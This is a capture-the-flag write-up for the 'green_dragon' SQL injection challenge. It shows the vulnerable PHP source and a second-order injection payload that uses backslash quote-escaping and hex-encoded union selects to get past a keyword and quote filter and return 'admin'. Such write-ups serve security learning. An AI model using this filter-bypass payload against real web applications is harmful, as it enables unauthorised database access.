# Green Dragon

```php
<?php
  include "./config.php";
  login_chk();
  $db = dbconnect();
  if(preg_match('/prob|_|\.|\'|\"/i', $_GET[id])) exit("No Hack ~_~");
  if(preg_match('/prob|_|\.|\'|\"/i', $_GET[pw])) exit("No Hack ~_~");
  $query = "select id,pw from prob_green_dragon where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if($result['id']){
    if(preg_match('/prob|_|\.|\'|\"/i', $result['id'])) exit("No Hack ~_~");
    if(preg_match('/prob|_|\.|\'|\"/i', $result['pw'])) exit("No Hack ~_~");
    $query2 = "select id from prob_green_dragon where id='{$result[id]}' and pw='{$result[pw]}'";
    echo "<hr>query2 : <strong>{$query2}</strong><hr><br>";
    $result = mysqli_fetch_array(mysqli_query($db,$query2));
    if($result['id'] == "admin") solve("green_dragon");
  }
  highlight_file(__FILE__);
?>
```

So green dragon clever  use of '\' is being used that is our query is select id,pw from prob_green_dragon where id='\' and pw=' 0 or 1 #ok
doesn't return anything so the table prob_green_dragon might be empty, that is there must be another table.

So we could  give something like select id,pw from prob_green_dragon where id='\' and pw=' union select('admin') #ok

But we are not allowed to use single qoutes(').

So lets take a query like this,
```sql
select id,pw from prob_green_dragon where id='\' and pw='union select 0x5c,0x756e696f6e2073656c656374203078363136343664363936652023 --+';
```
That will give an output of

```
+------+----------------------------+
| id   | pw                         |
+------+----------------------------+
| \    | union select 0x61646d696e # |
+------+----------------------------+
```

Now this output will be again used as the id and password for the next sql query that is as follows,

```sql
select id from prob_green_dragon where id='\' and pw='union select 0x61646d696e #';
```

Now that will give us 

+-------+
| id    |
+-------+
| admin |
+-------+

Hence the challenge is solved, by far the most interesting one, this was good...took me 4 days, but it was great.



